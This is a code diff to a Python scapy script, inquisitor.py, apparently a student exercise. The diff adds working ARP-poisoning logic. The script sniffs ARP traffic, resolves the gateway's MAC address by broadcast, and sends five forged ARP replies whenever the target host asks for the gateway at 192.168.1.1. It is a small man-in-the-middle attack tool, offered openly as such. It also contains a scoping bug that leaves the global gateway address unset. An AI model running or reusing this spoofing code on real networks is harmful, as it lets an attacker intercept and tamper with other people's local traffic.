@@ -12,7 +12,7 @@
 #                                                                              #
 # **************************************************************************** #
 
-from scapy.all import ARP, Ether, sendp, sniff
+from scapy.all import ARP, Ether, sendp, sniff, srp, Padding
 import argparse
 import sys
 
@@ -21,6 +21,7 @@ IP_SRC = ""
 MAC_SRC = ""
 IP_TARGET = ""
 MAC_TARGET = ""
+MAC_GATEWAY = ""
 
 # >>> ls(Ether)
 # dst        : DestMACField         = (None)
@@ -65,26 +66,42 @@ def create_arppkt():
 	return arppckt
 
 def send_packet(arppkt):
-	while True:
-		try:
-			sendp(arppkt, verbose=False)
-		except PermissionError as error:
-			print(f"inquisitor.py: error: {error}")
-			exit(1)
-		except KeyboardInterrupt:
-			print(f"Reset arp table")
-			return
+	try:
+		sendp(arppkt, verbose=False)
+	except PermissionError as error:
+		print(f"inquisitor.py: error: {error}")
+		exit(1)
+	except KeyboardInterrupt:
+		print(f"Reset arp table")
+		return
 
 def check_packet(packet):
 	print(packet)
-	if packet.psrc == IP_TARGET:
+	if ARP in packet and packet[ARP].psrc == IP_TARGET:
 		print("it's target!")
+		if packet[ARP].pdst == "192.168.1.1" and packet[ARP].op == 1:
+			print("target request to know gateway\n")
+			print("Prepare to ARP poisonning target:")
+			arppkt = create_arppkt()
+			arppkt.show()
+			for i in range(5):
+				send_packet(arppkt)
+
+def find_gateway_macaddr():
+	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="192.168.1.1")
+	print("Send this request to get gateway MAC address")
+	broadcast.show()
+	try:
+		response = srp(broadcast, timeout=2)
+	except:
+		print("inquisitor.py: error: cannot get mac address of gateway")
+		exit(1)
+	MAC_GATEWAY = response[0][0][1].hwsrc
+	print(f"Mac address of gateway: {MAC_GATEWAY}")
 
 def inquisitor():
+	find_gateway_macaddr()
 	sniff(filter="arp", prn=check_packet)
-	# arppkt = create_arppkt()
-	# arppkt.show()
-	# send_packet(arppkt)
 
 if __name__ == "__main__":
 	args = parse_arguments()
